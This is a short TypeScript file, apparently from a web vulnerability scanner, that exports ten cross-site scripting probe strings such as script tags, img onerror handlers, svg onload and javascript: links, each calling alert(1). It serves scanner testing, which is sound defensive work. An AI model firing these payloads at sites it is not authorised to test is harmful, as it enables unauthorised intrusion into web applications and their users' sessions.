// filepath: web-vulnerability-scanner/src/payloads/xssPayloads.ts
const xssPayloads = [
  "<script>alert(1)</script>",
  '"><script>alert(1)</script>',
  "<img src=x onerror=alert(1)>",
  "'><img src=x onerror=alert(1)>",
  "javascript:alert(1)",
  "<svg onload=alert(1)>",
  '<iframe src="javascript:alert(1)"></iframe>',
  "<body onload=alert(1)>",
  '<input type="text" value="x" onfocus="alert(1)">',
  '<a href="javascript:alert(1)">Click me</a>',
];

export default xssPayloads;
